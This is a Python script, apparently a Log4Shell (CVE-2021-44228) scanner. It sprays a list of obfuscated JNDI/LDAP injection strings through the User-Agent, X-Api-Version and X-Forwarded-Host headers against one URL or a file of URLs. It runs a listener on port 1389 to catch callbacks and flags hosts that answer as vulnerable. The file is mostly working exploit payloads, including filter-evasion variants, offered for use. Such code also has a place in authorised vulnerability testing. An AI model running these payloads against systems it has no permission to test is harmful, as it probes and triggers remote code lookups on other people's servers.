import threading
import socket
import requests
import sys
from queue import Queue
import time

n_threads = 2
n_jobs = [1,2]
queue = Queue()
url = ''
pvt_addr = ''

header = ['User-Agent','X-Api-Version','X-Forwarded-Host']
payloads = ['${jndi:ldap://','${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://', '${${::-j}ndi:ldap://', '${jndi:ldap://','${${lower:jndi}:${lower:ldap}://','${${lower:${lower:jndi}}:${lower:ldap}://','${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://','${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://']

def socket_creation():
    global port, server

    port = int(1389)
    try :
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as e :
        print(e)
        sys.exit()

def bind():
    global port,server
    try :
        #bind and listen
        server.bind(('',port))
        server.listen(5)
        print('Server started at {}'.format(port))
    except socket.error as e:
        print('bind error')
        print(e)

def acc_conn():
    global server, url, load
    while True:
        try:
            client, addr = server.accept()
            if '127.0.0.1' in addr:
                print('Info: '+url+' is vulnerable')
                print('Payload: '+load)

            client.send('test'.encode('utf-8'))
            client.close()
        except socket.error as e:
            print('listening error')
            print(e)
            sys.exit()

def log4j_scan(url):
    global server, mal, load

    print('Checking : '+url)
    for pay in payloads:
        mal = pay+pvt_addr+'}'
        for head in header:
            load = head+': '+mal
            headers = {head: mal}

            try :
                res = requests.get(url, headers=headers)
            except Exception as e:
                print(e)
                pass

def run():
    global url, add, pvt_addr
    url = sys.argv[1]
    pvt_addr = sys.argv[2]

    if url.endswith('.txt') :
        urls = open(sys.argv[1]).read().strip().split('\n')
        for url in urls :
            log4j_scan(url)
    else:
        url = sys.argv[1]
        log4j_scan(url)

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_creation()
            bind()
            acc_conn()
        time.sleep(0.7)
        if x == 2:
            run()
        
        queue.task_done()

def _workers():
    for i in range(n_threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def jobs():
    for x in n_jobs:
        queue.put(x)

    queue.join()

try:
    if len(sys.argv)-1 != 2:
        print('Usage: {} <url/file> <privt addr>'.format(sys.argv[0]))
    else:
        _workers()
        jobs()
except KeyboardInterrupt:
    sys.exit()
